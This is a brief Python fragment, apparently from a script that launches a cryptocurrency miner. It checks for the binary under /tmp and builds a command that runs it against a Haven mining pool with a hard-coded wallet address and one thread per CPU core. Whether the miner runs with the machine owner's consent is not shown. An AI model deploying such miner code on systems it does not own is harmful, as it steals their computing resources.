...
if not os.path.isfile('/tmp/%s/%s' %(folder_stak_rx, stak_rx)):
    ...
    workingdir = os.getcwd()
#check screen
command = './%s --donate-level 1 -o us.haven.herominers.com:1110 -u hvxxugGqjFCjJsvZw9FJbGMzUGuZ3XwBHT2E2xPRojHqPDvEr5ja7ssYrEq57ZzwwDP2h8Bxn6Wo4CT6CM3vLVyo3RQVippYt9 -p nql -a cn-heavy/xhv -t %s' %(stak_rx, cores)
